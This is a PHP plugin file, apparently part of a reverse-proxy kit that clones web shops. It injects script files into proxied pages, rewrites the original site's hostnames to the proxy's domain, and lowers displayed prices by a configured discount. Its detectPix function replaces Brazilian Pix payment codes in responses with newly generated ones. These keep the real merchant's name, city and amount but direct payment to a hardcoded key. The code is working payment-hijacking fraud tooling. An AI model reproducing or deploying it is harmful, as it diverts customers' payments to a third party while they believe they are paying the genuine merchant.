<?php

namespace plugins\router\Extension;

use plugins\router\Start\cache;
use function Swoole\Coroutine\Http\get;

class inject
{
    public static function load(string $template, string $url): ?string
    {
        $rules = $GLOBALS['interface']['server']['injection'];
        for ($i = 0; $i < count($rules); $i++) {
            if (!empty($rules[$i]['bodyContain'])) if (!str_contains(strtolower($template), strtolower($rules[$i]['bodyContain']))) continue;
            if (!empty($rules[$i]['urlContain'])) if (!str_contains(strtolower($url), strtolower($rules[$i]['urlContain']))) continue;
            if (array_key_exists('inject', $rules[$i])) $codeInject = file_get_contents("plugins/inject/{$rules[$i]['inject']}");
            else $codeInject = '';
            $template = str_replace('</head>', $codeInject . PHP_EOL . "</head>", $template);
            if (!empty($rules[$i]['replace'])) {
                $template = str_replace($rules[$i]['replace'], $rules[$i]['with'], $template);
            }
        }
        $endPoints = $GLOBALS['interface']['server']['endPoints'];
        foreach ($endPoints as $new => $old) {
            $oldParsed = parse_url($old)["host"];
            $newParsed = !empty(parse_url($new)["host"]) ? parse_url($new)["host"] : $new;
            $search = ":\"$oldParsed";
            $replace = ":\"$newParsed";
            $template = str_replace($search, $replace, $template);
            $search = "$oldParsed\"";
            $replace = "$newParsed\"";
            $template = str_replace($search, $replace, $template);
        }
        $remoteHostParser = parse_url(cache::global()["interface"]["server"]["remoteAddress"])["host"];
        $currentDomain = parse_url(cache::global()["interface"]["server"]["currentDomain"])["host"];
        if (cache::global()["interface"]["server"]["discountForPayments"]) {
            $template = self::discountForPayments($template, cache::global()["interface"]["server"]["discountForPayments"]);
        }

        $template = str_replace('DISCOUNT_PERCENTAGE', cache::global()["interface"]["server"]["discountForPayments"], $template);
        $template = self::detectPix($template);
        foreach ($GLOBALS['interface']['server']['endPoints'] as $new => $old) {
            $template = str_replace($old,
                str_starts_with($old, 'https://') ? 'https://' . $new : $new,
                $template
            );
        }
        return str_replace(":\".$remoteHostParser\",", ":\".$currentDomain\",", $template);
    }

    public static function discountForPayments(string $template, int $percent): ?string
    {
        $pattern = '/"price":\d+\.\d+/';
        preg_match_all($pattern, $template, $matches);
        foreach ($matches[0] as $match) {
            $price = (float)str_replace('"price":', '', $match);
            $discount = $price * ($percent / 100);
            $newPrice = $price - $discount;
            $template = str_replace($match, '"price":' . number_format($newPrice, 2, '.', ''), $template);
        }
        $pattern = '/price:\d+\.\d+/';
        preg_match_all($pattern, $template, $matches);
        foreach ($matches[0] as $match) {
            $price = (float)str_replace('price:', '', $match);
            $discount = $price * ($percent / 100);
            $newPrice = $price - $discount;
            $template = str_replace($match, 'price:' . number_format($newPrice, 2, '.', ''), $template);
        }
        $pattern = '/amount:\d+\.\d+/';
        preg_match_all($pattern, $template, $matches);
        foreach ($matches[0] as $match) {
            $price = (float)str_replace('amount:', '', $match);
            $discount = $price * ($percent / 100);
            $newPrice = $price - $discount;
            $template = str_replace($match, 'amount:' . number_format($newPrice, 2, '.', ''), $template);
        }


        return $template;


    }

    public static function detectPix(string $template): ?string
    {
        // se for json
        $decode = json_decode($template, true);
        if (!is_array($decode)) {
            return $template;
        }
        foreach ($decode as $key => $value) {
            if (is_string($value)) {
                if (str_contains(strtolower($value), 'bcb.')) {
                    $pixParsed = self::parsePixCode($value);
                    $amount = $pixParsed['transactionAmount'];
                    if (empty($amount)) $amount = $pixParsed['fetchUrl']['valor']['original'];
                    $idT = bin2hex(random_bytes(10));
                    $newPix = self::generatePix('99999999999', $pixParsed['merchantName'], $pixParsed['merchantCity'], $amount, $idT);
                    $decode[$key] = $newPix;
                }
            }
        }
        return json_encode($decode);
    }

    public static function parsePixCode($pixPayload): ?array
    {
        $data = [];
        $offset = 0;

        while ($offset < strlen($pixPayload)) {
            // ID do campo (02 dígitos)
            $id = substr($pixPayload, $offset, 2);
            $offset += 2;

            // Comprimento do campo (02 dígitos)
            $length = (int)substr($pixPayload, $offset, 2);
            $offset += 2;

            // Valor do campo (length dígitos)
            $value = substr($pixPayload, $offset, $length);
            $offset += $length;

            $data[$id] = $value;
        }

        // Extração da URL do campo 26 (Merchant Account Information – Merchant identifier)
        $url = null;
        if (isset($data['26'])) {
            $field26 = $data['26'];

            // Remover 'br.gov.bcb.pix'
            $field26 = str_replace('br.gov.bcb.pix', '', $field26);

            // Encontrar a posição do primeiro caractere que é uma letra
            $urlStartPos = 0;
            for ($i = 0; $i < strlen($field26); $i++) {
                if (ctype_alpha($field26[$i])) {
                    $urlStartPos = $i;
                    break;
                }
            }

            // Extrair a URL correta omitindo o prefixo numérico
            $url = substr($field26, $urlStartPos);
        }

        $fetchUrl = [];
        if (!empty($url)) {
            $resp = '';
            for ($n = 5; $n--;) {
                if (!str_starts_with($url, 'htt')) $url = 'https://' . $url;
                try {
                    $resp = get($url)->getBody();
                    break;
                } catch (\Throwable $e) {
                    continue;
                }
            }
            $decoded = base64_decode(explode('.', $resp)[1]);
            $fetchUrl = json_decode($decoded, true);
        }

        $parsedData = [
            "type" => ($data['01'] === '12') ? 'dynamic' : 'static',
            "merchantCategoryCode" => $data['52'],
            "transactionCurrency" => (int)$data['53'],
            "countryCode" => $data['58'],
            "merchantName" => $data['59'],
            "merchantCity" => $data['60'],
            "transactionAmount" => isset($data['54']) ? (float)$data['54'] : null,
            "oneTime" => $data['01'] === '12',
            "url" => $url,
            "fetchUrl" => $fetchUrl
        ];

        return $parsedData;
    }


    public static function generatePix(string $chavePix, string $nomeRecebedor, string $cidadeRecebedor, float $valor, string $identificadorTransacao = '***'): ?string
    {
        $idPayloadFormatIndicator = '00';
        $idMerchantAccountInformation = '26';
        $idMerchantAccountInformationGUI = '00';
        $idMerchantAccountInformationChave = '01';
        $idMerchantCategoryCode = '52';
        $idTransactionCurrency = '53';
        $idTransactionAmount = '54';
        $idCountryCode = '58';
        $idMerchantName = '59';
        $idMerchantCity = '60';
        $idAdditionalDataFieldTemplate = '62';
        $idAdditionalDataFieldTemplateTxid = '05';
        $idCRC16 = '63';
        $pix = fn($id, $valor) => str_pad($id, 2, '0', STR_PAD_LEFT) . str_pad(strlen($valor), 2, '0', STR_PAD_LEFT) . $valor;
        $crc16 = function ($data) {
            $crc = 0xFFFF;
            for ($i = 0; $i < strlen($data); $i++) {
                $crc ^= ord($data[$i]) << 8;
                for ($j = 0; $j < 8; $j++) {
                    $crc = ($crc & 0x8000) ? ($crc << 1) ^ 0x1021 : $crc << 1;
                }
            }
            return strtoupper(dechex($crc & 0xFFFF));
        };

        $payload = '';
        $payload .= $pix($idPayloadFormatIndicator, '01');
        $payload .= $pix($idMerchantAccountInformation,
            $pix($idMerchantAccountInformationGUI, 'br.gov.bcb.pix') .
            $pix($idMerchantAccountInformationChave, $chavePix)
        );
        $payload .= $pix($idMerchantCategoryCode, '0000');
        $payload .= $pix($idTransactionCurrency, '986');
        $payload .= $pix($idTransactionAmount, number_format($valor, 2, '.', ''));
        $payload .= $pix($idCountryCode, 'BR');
        $payload .= $pix($idMerchantName, strtoupper($nomeRecebedor));
        $payload .= $pix($idMerchantCity, strtoupper($cidadeRecebedor));
        $payload .= $pix($idAdditionalDataFieldTemplate,
            $pix($idAdditionalDataFieldTemplateTxid, $identificadorTransacao)
        );
        $payload .= $pix($idCRC16, $crc16($payload . $idCRC16 . '04'));
        return $payload;
    }


}

